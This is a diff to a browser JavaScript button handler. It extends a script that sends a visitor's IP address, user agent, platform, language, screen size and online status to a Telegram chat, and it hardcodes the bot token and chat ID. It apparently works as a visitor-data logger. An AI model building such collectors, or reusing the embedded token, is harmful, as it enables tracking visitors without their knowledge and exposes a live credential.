@@ -28,7 +28,13 @@ document.getElementById('sendInfoButton').addEventListener('click', async functi
     const userAgent = navigator.userAgent;
     const platform = navigator.platform;
 
-    // Construct the message text
+    // Get additional device information
+    const language = navigator.language || navigator.userLanguage; // Browser language
+    const screenWidth = window.screen.width; // Screen width
+    const screenHeight = window.screen.height; // Screen height
+    const onlineStatus = navigator.onLine ? 'Online' : 'Offline'; // Online status
+
+    // Construct the message text with additional info
     const botToken = '6524346899:AAFrXk72Y4VAfMXWsCoLfUPpRy-oSx4fefo';
     const chatId = '5747112293'; // Your chat ID
     const messageText = `
@@ -38,6 +44,9 @@ document.getElementById('sendInfoButton').addEventListener('click', async functi
         IP Address: ${ipAddress}
         User Agent: ${userAgent}
         Platform: ${platform}
+        Language: ${language}
+        Screen Size: ${screenWidth} x ${screenHeight}
+        Status: ${onlineStatus}
     `; // Multi-line message for better readability
 
     const url = `https://api.telegram.org/bot${botToken}/sendMessage`;
